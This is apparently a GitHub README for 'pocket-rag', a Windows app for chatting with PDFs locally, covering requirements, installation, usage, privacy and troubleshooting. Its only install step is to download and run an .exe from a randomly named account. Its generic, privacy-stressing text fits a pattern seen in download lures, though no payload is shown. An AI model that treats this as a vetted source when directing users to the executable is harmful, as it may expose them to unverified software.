# 🤖 pocket-rag - Chat with private documents locally today

[![Download pocket-rag for Windows](https://img.shields.io/badge/Download-Blue%20%7C%20Grey-blue)](https://github.com/hispaniolan-princecharles417/pocket-rag/releases)

pocket-rag lets you chat with your PDF files on your own computer. You keep your data private. You run this software without sending documents to the internet. It uses smart technology to read your files and answer your questions. You need no background in tech to use this tool.

## ⚙️ System Requirements

Your computer needs to meet these basic standards to run the software.

*   Windows 10 or Windows 11 operating system.
*   At least 8 gigabytes of system memory.
*   At least 10 gigabytes of free disk space.
*   A processor from the last five years.

If your computer uses an NVIDIA graphics card, the software performs faster. The app works on standard processors too, though it moves slower.

## 📥 How to Install

Follow these steps to set up the software on your machine.

1.  Visit the [official releases page](https://github.com/hispaniolan-princecharles417/pocket-rag/releases) to download the current version.
2.  Look for the file that ends in .exe.
3.  Click the file to start the download.
4.  Once the file arrives on your computer, double-click it to begin the installation.
5.  Follow the instructions on the screen.
6.  The installer creates a shortcut on your desktop.

## 🚀 Getting Started

Open the app using the shortcut on your desktop. The first time you launch the software, it prepares the internal database. This takes a few minutes depending on your internet speed, as it downloads small helper files for the language engine.

### Uploading Files

Once the app opens, you see a clear interface. 

1.  Click the button labeled "Upload PDF."
2.  Select the document you want to read.
3.  Wait for the progress bar to finish. This process turns your document into a format the computer understands.

### Asking Questions

After the upload finishes, look for the text box at the bottom of the screen.

1.  Type your question about the document into the box.
2.  Press the "Enter" key on your keyboard.
3.  The software reads the document parts relevant to your question.
4.  It generates an answer based only on the text you provided.

## 🔒 Privacy

Most chatbots send your data to the cloud. They store your files on their servers. pocket-rag works differently. It runs the entire process on your hardware. No data leaves your computer while you work. You do not need to create an account or provide an email address. You do not need an active internet connection after the first setup and model download.

## 🛠️ Troubleshooting

If you encounter issues, check these frequent solutions.

### The App Does Not Launch
Restart your computer. Ensure no other heavy programs remain open during your first run. Check that you have enough space on your hard drive. 

### The Answer Is Slow
If your computer lacks a dedicated graphics card, the process takes longer. This is normal for local artificial intelligence. Be patient while the model constructs the response. You might see a small loading indicator while the software works.

### The App Gives Incorrect Answers
The software relies on the text inside your PDF. If the PDF scan is poor or the text is blurry, the software struggles to read it. Use high-quality PDF files for the best results. If the document uses complex tables or images, the software might miss those details. 

## 🏗️ How it Works

The software uses a process called RAG. This stands for Retrieval-Augmented Generation. Instead of relying on general knowledge, it searches your specific PDF for facts. It creates a local index of your document. When you ask a question, it finds the right paragraph, sends that context to the local language model, and formats the answer for you.

We use the following technology components inside the app:

*   Ollama: This manages the language models like Gemma and Phi.
*   Weaviate: This stores your document data and finds the right answers quickly.
*   Nextjs: This creates the smooth interface you see on your screen.

## 📦 Updates and Support

We update the software to improve speed and accuracy. You can check the main page periodically to see if we released a new version. To update, simply download the new file and run it. The setup process replaces your old version with the new one while keeping your settings intact. 

This tool serves as a local alternative to online services. You control the library of documents. You control when the software runs. You own your data.